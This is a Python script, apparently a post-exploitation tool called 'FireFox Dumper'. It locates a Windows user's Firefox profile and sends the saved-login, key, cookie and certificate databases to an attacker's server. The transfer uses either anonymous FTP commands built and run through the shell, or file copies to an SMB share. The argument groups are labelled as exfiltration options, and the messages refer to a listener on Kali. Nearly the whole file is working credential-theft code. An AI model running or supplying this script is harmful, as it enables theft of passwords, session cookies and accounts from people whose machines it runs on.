import os
import time
import textwrap
import argparse
import re
import subprocess
import sys


def banner():
    print("    _______           ______              ____                                  ")
    print("   / ____(_)_______  / ____/___  _  __   / __ \__  ______ ___  ____  ___  _____ ")
    print("  / /_  / / ___/ _ \/ /_  / __ \| |/_/  / / / / / / / __ `__ \/ __ \/ _ \/ ___/ ")
    print(" / __/ / / /  /  __/ __/ / /_/ />  <   / /_/ / /_/ / / / / / / /_/ /  __/ /     ")
    print("/_/   /_/_/   \___/_/    \____/_/|_|  /_____/\__,_/_/ /_/ /_/ .___/\___/_/      ")
    print("                                                           /_/                  ")


def envinfo():
    global username, apples, results, bananas, cert9, cookies, logins, key4, t_IP, share
    t_IP = str(args.ip)
    share = str(args.share)
    username = os.getenv('Username')
    apples = os.listdir("C:\\Users\\" + username +
                        "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
    results = apples[1]
    bananas = ("C:\\Users\\" + username +
               "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\" + results)
    cert9 = (bananas + "\\cert9.db")
    cookies = (bananas + "\\cookies.sqlite")
    logins = (bananas + "\\logins.json")
    key4 = (bananas + "\\key4.db")


def main():
    global username, apples, results, bananas, cert9, cookies, logins, key4, t_IP, share
    try:
        if args.ftp:
            if args.port:
                t_IP = str(args.ip + " " + args.port)
            command = ("echo open " + t_IP + " >> ftp &echo user anonymous >> ftp &echo binary >> ftp &echo put " +
                       cert9 + " >> ftp &echo bye >> ftp &ftp -n -v -s:ftp &del ftp")
            stdout = subprocess.Popen(
                command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL).stdout
            response = stdout.read()
            response = str(response)
            valid_response = re.search(
                'Log in with USER and PASS first.', response)
            invalid_response = re.search('Not connected.', response)
            if valid_response:
                print(
                    '\n[success] Connection successful. Files transmitting to your FTP server.')
            if invalid_response:
                print(
                    '\n[warning] Connection refused. Check that you ran python3 -m pyftpdlib -p 21 -w on Kali and try again')
                sys.exit()
            time.sleep(.5)
            command = ("echo open " + t_IP + " >> ftp &echo user anonymous >> ftp &echo binary >> ftp &echo put " +
                       cookies + " >> ftp &echo bye >> ftp &ftp -n -v -s:ftp &del ftp")
            stdout = subprocess.Popen(
                command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL).stdout
            response = stdout.read()
            response = str(response)
            invalid_response = re.search('Not connected.', response)
            if invalid_response:
                print(
                    '\n[warning] Connection refused. Check that you ran python3 -m pyftpdlib -p 21 -w on Kali and try again')
                sys.exit()
            time.sleep(.5)
            command = ("echo open " + t_IP + " >> ftp &echo user anonymous >> ftp &echo binary >> ftp &echo put " +
                       logins + " >> ftp &echo bye >> ftp &ftp -n -v -s:ftp &del ftp")
            stdout = subprocess.Popen(
                command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL).stdout
            response = stdout.read()
            response = str(response)
            invalid_response = re.search('Not connected.', response)
            if invalid_response:
                print(
                    '\n[warning] Connection refused. Check that you ran python3 -m pyftpdlib -p 21 -w on Kali and try again')
                sys.exit()
            time.sleep(.5)
            command = ("echo open " + t_IP + " >> ftp &echo user anonymous >> ftp &echo binary >> ftp &echo put " +
                       key4 + " >> ftp &echo bye >> ftp &ftp -n -v -s:ftp &del ftp")
            stdout = subprocess.Popen(
                command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL).stdout
            response = stdout.read()
            response = str(response)
            invalid_response = re.search('Not connected.', response)
            if valid_response:
                print(
                    "\n[success] Files should have transmitted successfully. Check your FTP server directory.")
            if invalid_response:
                print(
                    '\n[warning] Connection refused. Check that you ran python3 -m pyftpdlib -p 21 -w on Kali and try again')
                sys.exit()
        elif args.smb is not None:
            try:
                t_IP = str(args.ip)
                command = ("copy " + cert9 + " \\\\" + t_IP + "\\" + share)
                stdout = subprocess.Popen(
                    command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL).stdout
                response = stdout.read()
                response = str(response)
                valid_response = re.search('1', response)
                if valid_response:
                    print(
                        '\n[success] Connection successful. Files transmitting to your SMB server.')
                invalid_response = re.search('0 file', response)
                command = ("copy " + cookies + " \\\\" + t_IP + "\\" + share)
                stdout = subprocess.Popen(
                    command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL).stdout
                command = ("copy " + logins + " \\\\" + t_IP + "\\" + share)
                stdout = subprocess.Popen(
                    command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL).stdout
                command = ("copy " + key4 + " \\\\" + t_IP + "\\" + share)
                stdout = subprocess.Popen(
                    command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL).stdout
                if valid_response:
                    print(
                        "\n[success] Files should have transmitted successfully. Check your SMB server directory.")
            except KeyboardInterrupt:
                quit()
    except KeyboardInterrupt:
        print("\nYou either fat fingered this, or meant to do it. Either way, goodbye!")
        sys.exit()


opt_parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter, epilog=textwrap.dedent(
    '''Example: python3 firefoxdumper.py -i 192.168.1.1
'''))
required = opt_parser.add_argument_group('Required arguments')
required.add_argument(
    '-i', '--ip', help='IP address hosting FTP server', required=True)
ftp_handler = opt_parser.add_argument_group('FTP exfiltration arguments')
ftp_handler.add_argument(
    '-p', '--port', help='Declares a specific port if port 80 is not used')
ftp_handler.add_argument(
    '-f', '--ftp', help='Transfers files over FTP', action='store_true')
smb_handler = opt_parser.add_argument_group('SMB exfiltration arguments')
smb_handler.add_argument(
    '-s', '--smb', help='Utilizes SMB rather than FTP', action='store_true')
smb_handler.add_argument(
    '-sh', '--share', help='Declares the share name (mandatory for SMB')
args = opt_parser.parse_args()

if __name__ == "__main__":
    envinfo()
    banner()
    main()
